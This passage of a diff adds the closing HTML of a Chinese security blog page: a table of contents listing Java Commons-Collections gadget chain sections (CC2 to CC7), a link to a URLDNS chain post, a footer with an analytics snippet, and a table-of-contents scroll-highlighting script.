+<li><a href="#cc2%E4%B9%8Btemplatesimpl%E5%88%A9%E7%94%A8%E9%93%BE">CC2之TemplatesImpl利用链</a></li>
+</ul>
+</li>
+<li><a href="#cc3">CC3</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3">前置知识</a>
+<ul>
+<li><a href="#traxfilter">TrAXFilter</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-3">利用链构造</a></li>
+</ul>
+</li>
+<li><a href="#cc4">CC4</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-4">利用链构造</a></li>
+</ul>
+</li>
+<li><a href="#cc5">CC5</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-5">利用链构造</a></li>
+</ul>
+</li>
+<li><a href="#cc6">CC6</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-6">利用链构造</a></li>
+</ul>
+</li>
+<li><a href="#cc7">CC7</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-7">利用链构造</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/8CMvYj3rV/">
+              <h3 class="post-title">
+                URLDNS调用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
